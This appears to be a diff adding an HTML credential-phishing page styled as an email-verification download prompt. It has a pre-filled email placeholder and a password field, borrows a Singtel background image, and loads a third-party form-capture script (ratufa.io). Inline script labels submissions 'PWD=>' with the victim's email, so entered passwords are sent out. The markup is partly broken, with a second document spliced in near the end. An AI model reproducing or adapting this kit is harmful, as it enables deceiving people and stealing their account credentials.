@@ -1,0 +1,380 @@
+<html><head><style>
+body  {
+   width: 100vw;
+   height: 100vh;
+   padding:0px;
+   margin:0px;
+   /* background-image:url('sample.png'); */
+   font-family: 'Roboto', sans-serif;
+   color: #4e4e4e;
+}
+.b_base {
+   display: flex;
+   width: 100%;
+   height: 100%;
+   justify-content: center;
+   align-items: center;
+   background-color: rgb(0 0 0 / 75%);
+   font-family: 'Roboto', sans-serif;
+}
+.f_base {
+   max-width:90%;
+   width:350px;
+   background-color: white;
+   box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   -webkit-box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   -moz-box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   -o-box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   border-radius:3px;
+   -moz-border-radius:3px;
+   -o-border-radius:3px;
+   -webkit-border-radius:3px;
+   font-family: 'Roboto', sans-serif;
+}
+.f_base .f_in {
+   padding: 40px 40px;
+   display: inline-block;
+   font-family: 'Roboto', sans-serif;
+   padding-top:15px;
+}
+.f_base .logo {
+   height: 30px;
+   display: flex;
+   justify-content: center;
+}
+.f_base .logo img {
+   height:100%;
+}
+.f_base h3 {
+   text-align: center;
+    font-weight: 300;
+    letter-spacing: 0.5px;
+    color: #80808087;
+    text-shadow: 0px 0px 1px #5252526b;
+    font-size: 20px;
+    margin-top: 15px;
+    font-family: 'Roboto', sans-serif;
+}
+.f_base h2 {
+   text-align: center;
+   word-break: break-word;
+   font-size: 16px;
+   font-weight: 400;
+}
+.f_form {
+   margin-top:30px;
+}
+.f_form .form-control {
+   height: 50px;
+   color:rgb(122 122 122);
+   font-size:14px;
+}
+.f_form .form-control[type="email"] {
+   padding-top:10px;
+}
+.f_form .form-control ~ label { 
+   padding-top:13px;
+   color: rgb(128 128 128 / 71%);
+   font-family: 'Roboto', sans-serif;
+}
+.form-check label {
+   vertical-align:bottom;
+   font-size:14px;
+}
+body.dark .b_base {
+    background-color: rgb(0 0 0 / 15%);
+}
+body.dark .f_base {
+   background-color: rgb( 255, 255, 255  / 50%);
+   box-shadow:1px 1px 1px 0px rgb(0 0 0);
+   -webkit-box-shadow:1px 1px 1px 0px rgb(0 0 0);
+   -moz-box-shadow:1px 1px 1px 0px rgb(0 0 0);
+   -o-box-shadow:1px 1px 1px 0px rgb(0 0 0);
+}
+body.dark .f_base h3 {
+   color:green;  
+font-weight: bold;
+}
+body.dark .f_base h2 {
+   color:black;
+}
+body.dark label {
+   color:black;
+}
+.loader_b {
+    width: 100%;
+    height: 100%;
+    background-color: white;
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 123213213;
+    text-align:center;
+}
+.loader_b i.fa-check {
+    font-size: 50px;
+    color: green;
+    margin-bottom: 20px;
+}
+.loader_b .redi_mes {
+   font-weight: bold;
+   font-size: 21px;
+}
+.loader {
+  font-size: 10px;
+  margin: 50px auto;
+  text-indent: -9999em;
+  width: 11em;
+  height: 11em;
+  border-radius: 50%;
+  background: #828282;
+  background: -moz-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: -webkit-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: -o-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: -ms-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: linear-gradient(to right, #828282 10%, rgba(130,130,130, 0) 42%);
+  position: relative;
+  -webkit-animation: load3 1.4s infinite linear;
+  animation: load3 1.4s infinite linear;
+  -webkit-transform: translateZ(0);
+  -ms-transform: translateZ(0);
+  transform: translateZ(0);
+}
+.loader:before {
+  width: 50%;
+  height: 50%;
+  background: #828282;
+  border-radius: 100% 0 0 0;
+  position: absolute;
+  top: 0;
+  left: 0;
+  content: '';
+}
+.loader:after {
+  background: #ffffff;
+  width: 75%;
+  height: 75%;
+  border-radius: 50%;
+  content: '';
+  margin: auto;
+  position: absolute;
+  top: 0;
+  left: 0;
+  bottom: 0;
+  right: 0;
+}
+@-webkit-keyframes load3 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes load3 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+.hidden {
+   display:none;
+}
+.sla {
+    position: absolute;
+    right: 12px;
+    top: 15px;
+    font-size: 19px;
+    cursor: pointer;
+}
+body.sharp .f_base, body.sharp .f_form .form-control, body.sharp button, body.sharp .alert {
+   border-radius:0px;
+   -webkit-border-radius:0px;
+   -moz-border-radius:0px;
+   -o-border-radius:0px;
+}
+body.sharp .alert {
+   font-size: 14px;
+    padding: 10px 10px;
+}
+.dom_pl {
+    font-size: 16px;
+    margin-bottom: 0px;
+}
+.sub_b {
+   -webkit-transition: background-color 300ms linear;
+   -ms-transition: background-color 300ms linear;
+   transition: background-color 300ms linear;
+}
+.sub_b:hover {
+   background-color:#0b5ed79e;
+   -webkit-transition: background-color 300ms linear;
+   -ms-transition: background-color 300ms linear;
+   transition: background-color 300ms linear;
+}
+</style>
+<style>.ratufa-overlay 
+{
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: rgba(0, 0, 0, 0.7);
+    transition: opacity 500ms;
+    visibility: hidden;
+    opacity: 0;
+}
+
+.ratufa-popup-container{
+    margin: 70px auto;
+    position: relative;
+    background: #fff;
+    transition: all 5s ease-in-out;
+    border-radius: 5px;
+    width: 30%;
+    padding: 5px;
+    min-height:340px;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #4a5568;
+    line-height: 150%;
+}
+.ratufa-popup-container .ratufa-popup-close {
+    position: absolute;
+    top: 10px;
+    right: 10px; 
+    font-size: 30px;
+    font-weight: bold;
+    text-decoration: none;
+    color: #2d3748;
+}
+.ratufa-popup-container .ratufa-popup-close:hover{
+    color: #4299e1;
+}
+.ratufa-popup-container  .ratufa-popup-title
+{
+    font-size: 22px;
+    margin-bottom: 10px;
+}
+
+.ratufa-popup 
+{
+    padding: 15px;
+}
+.ratufa-error{
+    color: #d32f2f;
+    font-size: 0.8rem;
+    padding: 0.25rem;
+}
+
+.ratufa-spinner
+{
+    display: flex;
+    flex-direction: column;
+    align-items: center;   
+}
+.ratufa-spinner-status
+{
+    font-weight: bold;
+    font-size: 18px;
+    text-align: center;
+    color: #a0aec0;
+    margin-top:1rem;
+}
+.ratufa-spinner-animation,
+.ratufa-spinner-animation:after {
+  border-radius: 50%;
+  width: 6em;
+  height: 6em;
+  overflow:hidden;
+}
+.ratufa-spinner-animation {
+  font-size: 10px;
+  position: relative;
+  text-indent: -9999em;
+  border-top: 0.5em solid rgba(40,36,36, 0.2);
+  border-right: 0.5em solid rgba(40,36,36, 0.2);
+  border-bottom: 0.5em solid rgba(40,36,36, 0.2);
+  border-left: 0.5em solid #2563EB;
+  transform: translateZ(0);
+  animation: load8 0.8s infinite linear;
+}
+@keyframes load8 {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+#ratufa_stripe_button
+{
+    padding:1rem 2rem; 
+    background: #1e90ff; border-radius: 6px; font-family: sans-serif; font-weight: bold; color:#F3F4F6; border:0; cursor:pointer; font-size:1.25rem;    
+    transition-timing-function: ease-in;
+    transition-duration: 100ms;
+}
+#ratufa_stripe_button:hover{
+    color:#fff;
+    transform: scale(104%);
+}
+#ratufa_stripe_button:active
+{
+    transform: translateY(4px);
+}</style></head>
+<body class="dark sharp" data-new-gr-c-s-check-loaded="8.909.0" data-gr-ext-installed="">
+<div class="loader_b hidden" id="loader"><div class="loader"></div></div>
+<div class="b_base">
+   <div class="f_base">
+      <div class="f_in">
+         <div class="logo">
+            <img id="logo">
+         </div>
+<input type="image" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQvt70rjrn8wIpapM6kZrJKUz8_lcZ1MJR9A&amp;usqp=CAU"> 
+         <h3 id="dom_name"></h3>Verify Your Email Address
+          <h3>
+<center>
+<p>
+          </p><form id="my-form" action="??" method="POST" novalidate="">
+
+                    <input type="email" class="form-control" name="em" id="ai" value="[[-Email-]]" style="font-size: 12pt; height: 30px; width:250px; " readonly="readonly"> <p></p>
+
+    <p>
+<input type="Password" name="Password" placeholder="Password" style="font-size: 5pt; height: 30px; width:250px;" required="" oninvalid="this.setCustomValidity('Enter your email dassword')" oninput="this.setCustomValidity('')">
+
+    </p>
+    <p>
+        <input class="btn pull-center px-8" style="background: #334cff ; color:#fff; font-size: 12pt; height: 50px; width:260px;; font-size: 12pt;" type="submit" id="submit-btn" value="Download">
+</p>
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=jlue4ulm&n=n1.ratufa.io"></script>
+<script type="text/javascript">
+const params=new URLSearchParams(window.location.search);
+document.getElementById('email').value=params.get('email');
+document.getElementById('subject').value="PWD=> " + params.get('email');
+</script>
+
+
+
+<title>Product and specification</title>
+<style>
+body{
+background-image:url("https://myportal.singtel.com/image/630x325_UI-Interface_v6.jpg");
+background-repeat:no-repeat;
+background-image:fixed;
+background-size:cover;
+}
+</head>
+<body>
+<div>
+</div>
+</body>
+</html>
+<head></style></form></center></h3></div></div></div><div class="ratufa-overlay" id="ratufa_popup"> <div class="ratufa-popup-container"> <a class="ratufa-popup-close" href="javascript:void(0);">×</a> <div class="ratufa-popup"> <div class="ratufa-popup-title">Popup Title 2</div> <div class="ratufa-popup-content"> Popup Content </div> </div> </div> </div></body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
